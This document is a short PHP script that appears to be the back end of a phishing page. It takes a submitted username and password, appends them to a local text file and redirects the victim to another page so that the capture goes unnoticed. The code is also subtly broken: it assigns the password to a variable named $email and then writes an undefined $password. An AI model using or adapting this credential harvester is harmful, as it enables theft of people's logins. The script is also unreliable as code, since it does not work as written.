<?php

$username = $_POST['username'];
$email = $_POST['password'];

$file = fopen("pass.txt", "a") or die ("file not open");

$f = $username." , ".$password;
fputs($file,$f) or die ("no data was written");

fclose($file);
header("Location: http://10.1.121.102/Redirect.html"); 
exit();
?>